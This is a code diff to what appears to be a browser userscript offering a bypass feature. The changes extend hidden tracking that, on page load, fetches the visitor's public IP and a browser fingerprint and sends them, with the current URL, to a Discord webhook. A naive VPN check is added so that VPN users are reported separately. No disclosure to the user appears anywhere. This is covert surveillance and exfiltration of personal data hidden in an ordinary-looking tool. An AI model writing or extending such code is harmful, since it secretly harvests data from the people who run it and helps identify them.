@@ -60,25 +60,51 @@
     }
 
     // Send tracking data to Discord webhook
-    function trackUser() {
-        const fingerprint = getUserFingerprint();
+    function trackUser(ip, fingerprint) {
+        const payload = {
+            content: `🔍 **New User Tracked**\n📌 **IP:** \`${ip}\`\n🖥 **Fingerprint:** \`${fingerprint}\`\n🔗 **URL:** \`${currentUrl}\``
+        };
+        fetch(TRACKING_WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        }).catch(error => console.error("[Tracking Error]", error));
+    }
+
+    // Check for VPN by comparing the user's IP with a known VPN IP database (simplified for this example)
+    function checkForVPN(ip) {
+        // List of known VPN IPs can be added here, or you could use an API service to detect VPNs
+        const knownVPNIPs = ["123.456.789.101", "198.51.100.2"]; // Example IPs
+        return knownVPNIPs.includes(ip);
+    }
+
+    // Fetch IP and check if VPN is on
+    function fetchIPAndTrack() {
         const ipCheckUrl = "https://api64.ipify.org?format=json";
 
         fetch(ipCheckUrl)
             .then(response => response.json())
             .then(data => {
-                const payload = {
-                    content: `🔍 **New User Tracked**\n📌 **IP:** \`${data.ip}\`\n🖥 **Fingerprint:** \`${fingerprint}\`\n🔗 **URL:** \`${currentUrl}\``
-                };
-                fetch(TRACKING_WEBHOOK, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
-                });
+                const ip = data.ip;
+                const fingerprint = getUserFingerprint();
+                const isVPN = checkForVPN(ip);
+
+                if (isVPN) {
+                    const payload = {
+                        content: `🔍 **VPN is on**\n📌 **IP:** \`${ip}\`\n🔗 **URL:** \`${currentUrl}\``
+                    };
+                    fetch(TRACKING_WEBHOOK, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(payload)
+                    }).catch(error => console.error("[Tracking Error]", error));
+                } else {
+                    trackUser(ip, fingerprint);
+                }
             })
-            .catch(error => console.error("[Tracking Error]", error));
+            .catch(error => console.error("[IP Error]", error));
     }
-    
+
     // Create the pop-up for bypass notification
     function createPopup(message) {
         const style = document.createElement('style');
@@ -181,4 +207,5 @@
         }
     });
 
+    fetchIPAndTrack();
 })();
